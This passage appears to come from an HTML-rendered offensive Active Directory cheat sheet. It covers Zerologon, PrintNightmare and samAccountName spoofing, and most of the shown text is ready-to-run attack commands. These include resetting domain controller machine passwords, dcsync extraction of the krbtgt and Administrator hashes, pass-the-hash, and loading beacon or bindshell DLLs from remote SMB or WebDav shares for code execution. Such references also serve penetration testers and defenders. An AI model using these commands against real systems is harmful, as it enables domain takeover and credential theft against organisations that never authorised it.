<a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="n">execute-assembly</span> <span class="n">SharpZeroLogon</span><span class="p">.</span><span class="n">exe</span> <span class="n">win-dc01</span><span class="p">.</span><span class="n">vulncorp</span><span class="p">.</span><span class="n">local</span>
<a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>
<a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="c"># Resetting the machine account password</span>
<a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a><span class="n">execute-assembly</span> <span class="n">SharpZeroLogon</span><span class="p">.</span><span class="n">exe</span> <span class="n">win-dc01</span><span class="p">.</span><span class="n">vulncorp</span><span class="p">.</span><span class="n">local</span> <span class="n">-reset</span>
<a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a>
<a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a><span class="c"># Testing from a non Domain-joined machine</span>
<a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a><span class="n">execute-assembly</span> <span class="n">SharpZeroLogon</span><span class="p">.</span><span class="n">exe</span> <span class="n">win-dc01</span><span class="p">.</span><span class="n">vulncorp</span><span class="p">.</span><span class="n">local</span> <span class="n">-patch</span>
<a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a>
<a id="__codelineno-43-11" name="__codelineno-43-11" href="#__codelineno-43-11"></a><span class="c"># Now reset the password back</span>
</code></pre></div></p>
</li>
<li>
<p><code>Mimikatz</code> - 2.2.0 20200917 Post-Zerologon
  <div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
<a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="c"># Check for the CVE</span>
<a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">zerologon</span> <span class="p">/</span><span class="n">target</span><span class="p">:</span><span class="n">DC01</span><span class="p">.</span><span class="n">LAB</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">/</span><span class="n">account</span><span class="p">:</span><span class="n">DC01</span><span class="p">$</span>
<a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>
<a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="c"># Exploit the CVE and set the computer account&#39;s password to &quot;&quot;</span>
<a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">zerologon</span> <span class="p">/</span><span class="n">target</span><span class="p">:</span><span class="n">DC01</span><span class="p">.</span><span class="n">LAB</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">/</span><span class="n">account</span><span class="p">:</span><span class="n">DC01</span><span class="p">$</span> <span class="p">/</span><span class="n">exploit</span>
<a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a>
<a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a><span class="c"># Execute dcsync to extract some hashes</span>
<a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">LAB</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">DC01</span><span class="p">.</span><span class="n">LAB</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">krbtgt</span> <span class="p">/</span><span class="n">authuser</span><span class="p">:</span><span class="n">DC01</span><span class="p">$</span> <span class="p">/</span><span class="n">authdomain</span><span class="p">:</span><span class="n">LAB</span> <span class="p">/</span><span class="n">authpassword</span><span class="p">:</span><span class="s2">&quot;&quot;</span> <span class="p">/</span><span class="n">authntlm</span>
<a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">LAB</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">DC01</span><span class="p">.</span><span class="n">LAB</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">authuser</span><span class="p">:</span><span class="n">DC01</span><span class="p">$</span> <span class="p">/</span><span class="n">authdomain</span><span class="p">:</span><span class="n">LAB</span> <span class="p">/</span><span class="n">authpassword</span><span class="p">:</span><span class="s2">&quot;&quot;</span> <span class="p">/</span><span class="n">authntlm</span>
<a id="__codelineno-44-11" name="__codelineno-44-11" href="#__codelineno-44-11"></a>
<a id="__codelineno-44-12" name="__codelineno-44-12" href="#__codelineno-44-12"></a><span class="c"># Pass The Hash with the extracted Domain Admin hash</span>
<a id="__codelineno-44-13" name="__codelineno-44-13" href="#__codelineno-44-13"></a><span class="n">sekurlsa</span><span class="p">::</span><span class="n">pth</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">LAB</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">HASH_NTLM_ADMIN</span>
<a id="__codelineno-44-14" name="__codelineno-44-14" href="#__codelineno-44-14"></a>
<a id="__codelineno-44-15" name="__codelineno-44-15" href="#__codelineno-44-15"></a><span class="c"># Use IP address instead of FQDN to force NTLM with Windows APIs </span>
<a id="__codelineno-44-16" name="__codelineno-44-16" href="#__codelineno-44-16"></a><span class="c"># Reset password to Waza1234/Waza1234/Waza1234/</span>
<a id="__codelineno-44-17" name="__codelineno-44-17" href="#__codelineno-44-17"></a><span class="c"># https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584</span>
<a id="__codelineno-44-18" name="__codelineno-44-18" href="#__codelineno-44-18"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">postzerologon</span> <span class="p">/</span><span class="n">target</span><span class="p">:</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="p">/</span><span class="n">account</span><span class="p">:</span><span class="n">DC01</span><span class="p">$</span>
</code></pre></div></p>
</li>
<li>
<p><code>CrackMapExec</code> - only check
  <div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">password</span> <span class="n">-d</span> <span class="n">domain</span> <span class="n">-M</span> <span class="n">zerologon</span>
</code></pre></div></p>
</li>
</ol>
<p>A 2nd approach to exploit zerologon is done by relaying authentication.</p>
<p>This technique, <a href="https://dirkjanm.io/a-different-way-of-abusing-zerologon">found by dirkjanm</a>, requires more prerequisites but has the advantage of having no impact on service continuity.
The following prerequisites are needed:
* A domain account
* One DC running the <code>PrintSpooler</code> service
* Another DC vulnerable to zerologon</p>
<ul>
<li><code>ntlmrelayx</code> - from Impacket and any tool such as <a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py"><code>printerbug.py</code></a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="c"># Check if one DC is running the PrintSpooler service</span>
<a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="n">rpcdump</span><span class="p">.</span><span class="n">py</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">-A</span> <span class="n">6</span> <span class="s2">&quot;spoolsv&quot;</span>
<a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>
<a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a><span class="c"># Setup ntlmrelay in one shell</span>
<a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a><span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">dcsync</span><span class="p">://</span><span class="n">DC01</span><span class="p">.</span><span class="n">LAB</span><span class="p">.</span><span class="n">LOCAL</span> <span class="n">-smb2support</span>
<a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a>
<a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a><span class="c">#Trigger printerbug in 2nd shell</span>
<a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a><span class="n">python3</span> <span class="n">printerbug</span><span class="p">.</span><span class="n">py</span> <span class="s1">&#39;LAB.LOCAL&#39;</span><span class="p">/</span><span class="n">joe</span><span class="p">:</span><span class="n">Password123</span><span class="nv">@10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">12</span>
</code></pre></div></li>
</ul>
<h3 id="printnightmare">PrintNightmare</h3>
<blockquote>
<p>CVE-2021-1675 / CVE-2021-34527</p>
</blockquote>
<p>The DLL will be stored in <code>C:\Windows\System32\spool\drivers\x64\3\</code>.
The exploit will execute the DLL either from the local filesystem or a remote share.</p>
<p>Requirements:
* <strong>Spooler Service</strong> enabled (Mandatory)
* Server with patches &lt; June 2021
* DC with <code>Pre Windows 2000 Compatibility</code> group
* Server with registry key <code>HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall</code> = (DWORD) 1
* Server with registry key <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA</code> = (DWORD) 0</p>
<p><strong>Detect the vulnerability</strong>:
* Impacket - <a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/rpcdump.py">rpcdump</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="n">python3</span> <span class="p">./</span><span class="n">rpcdump</span><span class="p">.</span><span class="n">py</span> <span class="nv">@10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">10</span> <span class="p">|</span> <span class="n">egrep</span> <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
<a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="n">Protocol</span><span class="p">:</span> <span class="p">[</span><span class="n">MS-RPRN</span><span class="p">]:</span> <span class="n">Print</span> <span class="n">System</span> <span class="n">Remote</span> <span class="n">Protocol</span>
</code></pre></div>
* <a href="https://github.com/byt3bl33d3r/ItWasAllADream">It Was All A Dream</a> 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">byt3bl33d3r</span><span class="p">/</span><span class="n">ItWasAllADream</span>
<a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="nb">cd </span><span class="n">ItWasAllADream</span> <span class="p">&amp;&amp;</span> <span class="n">poetry</span> <span class="n">install</span> <span class="p">&amp;&amp;</span> <span class="n">poetry</span> <span class="n">shell</span>
<a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="n">itwasalladream</span> <span class="n">-u</span> <span class="n">user</span> <span class="n">-p</span> <span class="n">Password123</span> <span class="n">-d</span> <span class="n">domain</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">/</span><span class="n">24</span>
<a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="n">docker</span> <span class="n">run</span> <span class="n">-it</span> <span class="n">itwasalladream</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">Password123</span> <span class="n">-d</span> <span class="n">domain</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
</code></pre></div></p>
<p><strong>Payload Hosting</strong>: 
* The payload can be hosted on Impacket SMB server since <a href="https://github.com/SecureAuthCorp/impacket/pull/1109">PR #1109</a>:
<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="n">python3</span> <span class="p">./</span><span class="n">smbserver</span><span class="p">.</span><span class="n">py</span> <span class="n">share</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">smb</span><span class="p">/</span>
</code></pre></div>
* Using <a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1">Invoke-BuildAnonymousSMBServer</a> (Admin rights required on host): 
<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-BuildAnonymousSMBServer</span><span class="p">.</span><span class="n">ps1</span><span class="p">;</span> <span class="nb">Invoke-BuildAnonymousSMBServer</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">Share</span> <span class="n">-Mode</span> <span class="n">Enable</span>
</code></pre></div>
* Using WebDav with <a href="https://github.com/mgeeky/SharpWebServer">SharpWebServer</a> (Doesn't require admin rights):
<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="n">SharpWebServer</span><span class="p">.</span><span class="n">exe</span> <span class="n">port</span><span class="p">=</span><span class="n">8888</span> <span class="n">dir</span><span class="p">=</span><span class="n">c</span><span class="p">:\</span><span class="n">users</span><span class="p">\</span><span class="n">public</span> <span class="n">verbose</span><span class="p">=</span><span class="n">true</span>
</code></pre></div>
When using WebDav instead of SMB, you must add <code>@[PORT]</code> to the hostname in the URI, e.g.: <code>\\172.16.1.5@8888\Downloads\beacon.dll</code>
WebDav client <strong>must</strong> be activated on exploited target. By default it is not activated on Windows workstations (you have to <code>net start webclient</code>) and it's not installed on servers. Here is how to detect activated webdav:
<div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="n">cme</span> <span class="n">smb</span> <span class="n">-u</span> <span class="n">user</span> <span class="n">-p</span> <span class="n">password</span> <span class="n">-d</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="n">-M</span> <span class="n">webdav</span> <span class="no">[TARGET]</span>
</code></pre></div></p>
<p><strong>Trigger the exploit</strong>: </p>
<ul>
<li><a href="https://github.com/cube0x0/CVE-2021-1675">SharpNightmare</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="c"># require a modified Impacket: https://github.com/cube0x0/impacket</span>
<a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="n">python3</span> <span class="p">./</span><span class="n">CVE</span><span class="p">-</span><span class="n">2021</span><span class="p">-</span><span class="n">1675</span><span class="p">.</span><span class="n">py</span> <span class="n">hackit</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">domain_user</span><span class="p">:</span><span class="n">Pass123</span><span class="nv">@192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">10</span> <span class="s1">&#39;\\192.168.1.215\smb\addCube.dll&#39;</span>
<a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a><span class="n">python3</span> <span class="p">./</span><span class="n">CVE</span><span class="p">-</span><span class="n">2021</span><span class="p">-</span><span class="n">1675</span><span class="p">.</span><span class="n">py</span> <span class="n">hackit</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">domain_user</span><span class="p">:</span><span class="n">Pass123</span><span class="nv">@192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">10</span> <span class="s1">&#39;C:\addCube.dll&#39;</span>
<a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a><span class="c">## LPE</span>
<a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a><span class="n">SharpPrintNightmare</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">addCube</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a><span class="c">## RCE using existing context</span>
<a id="__codelineno-53-7" name="__codelineno-53-7" href="#__codelineno-53-7"></a><span class="n">SharpPrintNightmare</span><span class="p">.</span><span class="n">exe</span> <span class="s1">&#39;\\192.168.1.215\smb\addCube.dll&#39;</span> <span class="s1">&#39;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL&#39;</span> <span class="s1">&#39;\\192.168.1.20&#39;</span>
<a id="__codelineno-53-8" name="__codelineno-53-8" href="#__codelineno-53-8"></a><span class="c">## RCE using runas /netonly</span>
<a id="__codelineno-53-9" name="__codelineno-53-9" href="#__codelineno-53-9"></a><span class="n">SharpPrintNightmare</span><span class="p">.</span><span class="n">exe</span> <span class="s1">&#39;\\192.168.1.215\smb\addCube.dll&#39;</span>  <span class="s1">&#39;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&#39;</span> <span class="s1">&#39;\\192.168.1.10&#39;</span> <span class="n">hackit</span><span class="p">.</span><span class="n">local</span> <span class="n">domain_user</span> <span class="n">Pass123</span>
</code></pre></div></li>
<li><a href="https://github.com/calebstewart/CVE-2021-1675">Invoke-Nightmare</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="c">## LPE only (PS1 + DLL)</span>
<a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">cve</span><span class="p">-</span><span class="n">2021</span><span class="p">-</span><span class="n">1675</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a><span class="nb">Invoke-Nightmare</span> <span class="c"># add user `adm1n`/`P@ssw0rd` in the local admin group by default</span>
<a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a><span class="nb">Invoke-Nightmare</span> <span class="n">-DriverName</span> <span class="s2">&quot;Dementor&quot;</span> <span class="n">-NewUser</span> <span class="s2">&quot;d3m3nt0r&quot;</span> <span class="n">-NewPassword</span> <span class="s2">&quot;AzkabanUnleashed123*&quot;</span> 
<a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a><span class="nb">Invoke-Nightmare</span> <span class="n">-DLL</span> <span class="s2">&quot;C:\absolute\path\to\your\bindshell.dll&quot;</span>
</code></pre></div></li>
<li><a href="https://github.com/gentilkiwi/mimikatz/releases">Mimikatz v2.2.0-20210709+</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="c">## LPE</span>
<a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="n">misc</span><span class="p">::</span><span class="n">printnightmare</span> <span class="p">/</span><span class="n">server</span><span class="p">:</span><span class="n">DC01</span> <span class="p">/</span><span class="n">library</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">user1</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">mimispool</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="c">## RCE</span>
<a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="n">misc</span><span class="p">::</span><span class="n">printnightmare</span> <span class="p">/</span><span class="n">server</span><span class="p">:</span><span class="n">CASTLE</span> <span class="p">/</span><span class="n">library</span><span class="p">:\\</span><span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">12</span><span class="p">\</span><span class="n">smb</span><span class="p">\</span><span class="n">beacon</span><span class="p">.</span><span class="n">dll</span> <span class="p">/</span><span class="n">authdomain</span><span class="p">:</span><span class="n">LAB</span> <span class="p">/</span><span class="n">authuser</span><span class="p">:</span><span class="n">Username</span> <span class="p">/</span><span class="n">authpassword</span><span class="p">:</span><span class="n">Password01</span> <span class="p">/</span><span class="k">try</span><span class="p">:</span><span class="n">50</span>
</code></pre></div></li>
<li><a href="https://github.com/outflanknl/PrintNightmare">PrintNightmare - @outflanknl</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="n">PrintNightmare</span> <span class="no">[target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password]</span>
</code></pre></div></li>
</ul>
<p><strong>Debug informations</strong></p>
<table>
<thead>
<tr>
<th>Error</th>
<th>Message</th>
<th>Debug</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x5</td>
<td><code>rpc_s_access_denied</code></td>
<td>Permissions on the file in the SMB share</td>
</tr>
<tr>
<td>0x525</td>
<td><code>ERROR_NO_SUCH_USER</code></td>
<td>The specified account does not exist.</td>
</tr>
<tr>
<td>0x180</td>
<td>unknown error code</td>
<td>Share is not SMB2</td>
</tr>
</tbody>
</table>
<h3 id="samaccountname-spoofing">samAccountName spoofing</h3>
<blockquote>
<p>During S4U2Self, the KDC will try to append a '\$' to the computer name specified in the TGT, if the computer name is not found. An attacker can create a new machine account with the sAMAccountName set to a domain controller's sAMAccountName - without the '\$'. For instance, suppose there is a domain controller with a sAMAccountName set to 'DC\$'. An attacker would then create a machine account with the sAMAccountName set to 'DC'. The attacker can then request a TGT for the newly created machine account. After the TGT has been issued by the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC. The attacker can then perform S4U2Self and request a ST to itself as any user. Since the machine account with the sAMAccountName set to 'DC' has been renamed, the KDC will try to find the machine account by appending a '$', which will then match the domain controller. The KDC will then issue a valid ST for the domain controller.</p>
</blockquote>
<p><strong>Requirements</strong></p>
<ul>
<li>MachineAccountQuota &gt; 0</li>
</ul>
<p><strong>Check for exploitation</strong></p>
<ol>
<li>Check the MachineAccountQuota of the account
  <div class="highlight"><pre><span></span><code><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="n">crackmapexec</span> <span class="n">ldap</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="s1">&#39;Password123&#39;</span> <span class="n">-d</span> <span class="s1">&#39;domain.local&#39;</span> <span class="p">-</span><span class="n">-kdcHost</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-M</span> <span class="n">MAQ</span>
<a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a><span class="n">StandIn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-object</span> <span class="n">ms-DS-MachineAccountQuota</span><span class="p">=*</span>
</code></pre></div></li>
<li>Check if the DC is vulnerable
  <div class="highlight"><pre><span></span><code><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="s1">&#39;&#39;</span> <span class="n">-p</span> <span class="s1">&#39;&#39;</span> <span class="n">-d</span> <span class="n">domain</span> <span class="n">-M</span> <span class="n">nopac</span>
</code></pre></div></li>
</ol>
<p><strong>Exploitation</strong></p>
<ol>
<li>Create a computer account
    <div class="highlight"><pre><span></span><code><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="n">impacket</span><span class="nv">@linux</span><span class="p">&gt;</span> <span class="n">addcomputer</span><span class="p">.</span><span class="n">py</span> <span class="n">-computer-name</span> <span class="s1">&#39;ControlledComputer$&#39;</span> <span class="n">-computer-pass</span> <span class="s1">&#39;ComputerPassword&#39;</span> <span class="n">-dc-host</span> <span class="n">DC01</span> <span class="n">-domain-netbios</span> <span class="n">domain</span> <span class="s1">&#39;domain.local/user1:complexpassword&#39;</span>
<a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>
<a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a><span class="n">powermad</span><span class="nv">@windows</span><span class="p">&gt;</span> <span class="p">.</span> <span class="p">.\</span><span class="n">Powermad</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a><span class="n">powermad</span><span class="nv">@windows</span><span class="p">&gt;</span> <span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;ComputerPassword&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a><span class="n">powermad</span><span class="nv">@windows</span><span class="p">&gt;</span> <span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="s2">&quot;ControlledComputer&quot;</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nv">$password</span><span class="p">)</span> <span class="n">-Domain</span> <span class="s2">&quot;domain.local&quot;</span> <span class="n">-DomainController</span> <span class="s2">&quot;DomainController.domain.local&quot;</span> <span class="n">-Verbose</span>
<a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a>
<a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a><span class="n">sharpmad</span><span class="nv">@windows</span><span class="p">&gt;</span> <span class="n">Sharpmad</span><span class="p">.</span><span class="n">exe</span> <span class="n">MAQ</span> <span class="n">-Action</span> <span class="n">new</span> <span class="n">-MachineAccount</span> <span class="n">ControlledComputer</span> <span class="n">-MachinePassword</span> <span class="n">ComputerPassword</span>
</code></pre></div></li>
<li>Clear the controlled machine account <code>servicePrincipalName</code> attribute
    <div class="highlight"><pre><span></span><code><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="n">impacket</span><span class="nv">@linux</span><span class="p">&gt;</span> <span class="n">addspn</span><span class="p">.</span><span class="n">py</span> <span class="n">-u</span> <span class="s1">&#39;domain\user&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="n">-t</span> <span class="s1">&#39;ControlledComputer$&#39;</span> <span class="n">-c</span> <span class="n">DomainController</span>
<a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>
<a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a><span class="n">powershell</span><span class="nv">@windows</span><span class="p">&gt;</span> <span class="p">.</span> <span class="p">.\</span><span class="n">Powerview</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a><span class="n">powershell</span><span class="nv">@windows</span><span class="p">&gt;</span> <span class="nb">Set-DomainObject</span> <span class="s2">&quot;CN=ControlledComputer,CN=Computers,DC=domain,DC=local&quot;</span> <span class="n">-Clear</span> <span class="s1">&#39;serviceprincipalname&#39;</span> <span class="n">-Verbose</span>
</code></pre></div></li>
<li>(CVE-2021-42278) Change the controlled machine account <code>sAMAccountName</code> to a Domain Controller's name without the trailing <code>$</code>
    <div class="highlight"><pre><span></span><code><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="c"># https://github.com/SecureAuthCorp/impacket/pull/1224</span>
<a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a><span class="n">impacket</span><span class="nv">@linux</span><span class="p">&gt;</span> <span class="n">renameMachine</span><span class="p">.</span><span class="n">py</span> <span class="n">-current-name</span> <span class="s1">&#39;ControlledComputer$&#39;</span> <span class="n">-new-name</span> <span class="s1">&#39;DomainController&#39;</span> <span class="n">-dc-ip</span> <span class="s1">&#39;DomainController.domain.local&#39;</span> <span class="s1">&#39;domain.local&#39;</span><span class="p">/</span><span class="s1">&#39;user&#39;</span><span class="p">:</span><span class="s1">&#39;password&#39;</span>
<a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>
